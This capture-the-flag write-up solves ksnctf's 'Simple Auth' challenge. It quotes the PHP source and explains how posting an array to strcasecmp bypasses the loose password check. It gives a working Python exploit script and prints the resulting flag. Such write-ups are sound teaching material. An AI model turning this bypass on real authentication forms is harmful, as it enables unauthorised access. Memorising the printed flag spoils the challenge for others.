Simple Auth is worth 50 points and we were given the following text.

```
simple vulnerability
http://ctfq.sweetduet.info:10080/~q32/auth.php
source
```

The url for the source is [here](http://ksnctf.sweetduet.info/q/32/auth.php).

Looking at the source, we can see the following codes.
```
<!DOCTYPE html>
<html>
  <head>
    <title>Simple Auth</title>
  </head>
  <body>
    <div>
<?php
$password = 'FLAG_????????????????';
if (isset($_POST['password']))
    if (strcasecmp($_POST['password'], $password) == 0)
        echo "Congratulations! The flag is $password";
    else
        echo "incorrect...";
?>
    </div>
    <form method="POST">
      <input type="password" name="password">
      <input type="submit">
    </form>
  </body>
</html>
```

This is a classic PHP bug as shown here:
https://bugs.php.net/bug.php?id=64069

As you can see from the bug report, function [strcasecmp](http://php.net/manual/en/function.strcasecmp.php) will return NULL if it gets an array.

So using the script below, we will be able to bypass strcasecmp and get the flag.
```
import urllib
import urllib2

url = 'http://ctfq.sweetduet.info:10080/~q32/auth.php'
data = {
"password[]": "hello",
}

req = urllib2.Request(url, urllib.urlencode(data), headers={'Content-type': 'application/x-www-form-urlencoded', 'Accept' : 'text/plain'})
resp = urllib2.urlopen(req)
szPage = resp.read()
print szPage
```
Running the above script, we will get the following text. ```Congratulations! The flag is FLAG_VQcTWEK7zZYzvLhX```


